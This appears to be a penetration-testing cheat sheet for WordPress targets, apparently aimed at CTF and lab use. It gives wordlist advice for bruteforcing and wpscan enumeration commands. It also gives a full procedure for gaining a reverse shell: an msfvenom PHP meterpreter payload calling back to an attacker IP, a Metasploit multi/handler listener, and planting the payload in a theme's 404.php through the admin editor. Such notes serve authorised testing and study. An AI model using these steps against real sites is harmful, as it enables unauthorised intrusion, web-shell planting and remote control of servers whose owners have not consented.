A suggested wordlist for bruteforce is fasttrack.txt but with season/years updated
to current year + possibly custom words depending on the scenario
if it is a ctf, I would add th first 500 of rockyou.txt

# Enumerate and Scan through wpscan
wpscan --url http://example.com --enumerate --api-token <TOKENHERE>
;; or
docker run -it --rm wpscanteam/wpscan  --url http://10.10.111.55  --enumerate --plugins-detection aggressive --api-token <TOKENHERE>

# Stealthier scan
wpscan --stealthy --url myblog.com --enumerate --api-token <TOKENHERE>

# Scan all Plugins and all Themes
;; Many times wpscan does not list all the plugins, so be sure to perform 
;; this step and go manually to search for vulnerabilities for the found plugins
;; by keeping into account their version
docker run -it --rm wpscanteam/wpscan  --url http://10.10.111.55  --enumerate ap,at --plugins-detection aggressive --api-token <TOKENHERE>
;; useful to find vulnerabilities that are not found by wpscan
;; especially as a second run of wpscan
;; Once we find a plugin we generally find notes about the plugin 
;; in the directory found within the readme.txt file

# Upload a shell through themes (must have wp administrative rights)
We first have to generate the desired PHP payload can be generated for
example through:

    msfvenom -p php/meterpreter_reverse_tcp LHOST=10.11.19.217 LPORT=5555 -f raw > shell.php

Open a multi handler with the same payload matched by doing from an msf console:
> use multi/handler
> set PAYLOAD php/meterpreter_reverse_tcp
> set LHOST=tun0
> set LPORT=5555
> set ExitOnSession false
> run -j 

Then go from an admin wordpress dashboard to:
Appearance -> Themes -> Editor

Here, edit the 404 template of a plugin and put inside the generated payload,
for example it can be a php meterpreter reverse TCP or just a reverse
TCP shell.

Then paste your payload in the apposite page, then we can
reach the target page to run the payload, generally if we have
chosen the 404 page, it may be located here: 

    http://$TARGETIP/wordpress/wp-content/themes/<themename>/404.php

for example with the twentyfifteen theme (a common theme):

    http://$TARGETIP/wordpress/wp-content/themes/twentyfifteen/404.php

Once we land on this page we should get the reverse shell.
